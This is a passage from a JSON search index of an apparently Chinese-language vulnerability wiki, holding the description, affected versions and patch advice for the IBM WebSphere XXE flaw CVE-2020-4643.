\u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52307.0.0.45\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01","title":"IBM WebSphere\u5b58\u5728XXE\u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a\u6f0f\u6d1e CVE-2020-4643"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_1","text":"IBM WebSphere \u5e94\u2f64\u7a0b\u5e8f\u670d\u52a1\u56687.0\u30018.0\u30018.5 \u548c9.0 \u5728\u5904\u7406XML \u6570\u636e\u65f6\u5bb9\u6613\u53d7\u5230XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a \uff08XXE\uff09 \u653b\u51fb\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u2f64\u6b64\u6f0f\u6d1e\u516c\u5f00\u654f\u611f\u4fe1\u606f\u3002IBM Xforce ID\uff1a185590\u3002","title":"\u6f0f\u6d1e\u5206\u6790\uff1a"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_2","text":"WebSphere Application Server 7.0\u7248\u672c WebSphere Application Server 8.0\u7248\u672c WebSphere Application Server 8.5\u7248\u672c WebSphere Application Server 9.0\u7248\u672c","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_3","text":"\u5b98\u2f45\u5df2\u7ecf\u63d0\u4f9b\u7684\u8865\u4e01\u7248\u672c\u5217\u8868\uff1a WebSphere 9.0.0.0 - 9.0.5.5\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52309.0.5.6\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.5.0.0 - 8.5.5.17\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52308.5.5.19\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.0.0.0 - 8.0.0.15\u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52308.0.0.15\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01 WebSphere 7.0.0.0 - 7.0.0.45 \u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52307.0.0.45\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01","title":"\u4fee\u590d\u5efa\u8bae\uff1a"}]}